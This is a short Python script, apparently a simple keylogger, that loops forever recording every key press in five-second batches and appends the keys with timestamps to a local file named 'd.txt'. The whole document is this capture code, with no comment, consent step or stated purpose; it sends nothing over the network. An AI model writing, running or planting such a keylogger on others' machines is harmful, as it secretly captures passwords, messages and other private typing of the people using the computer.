import keyboard
import datetime
import time


while(True):
    keyboard.start_recording()
    time.sleep(5)
    a=keyboard.stop_recording()
    with open('d.txt','a') as file:
        file.write('\n'+str(datetime.datetime.now())+' : \n')
        for i in a:
            if(i.event_type=='down'):
                file.write(i.name+'  ')
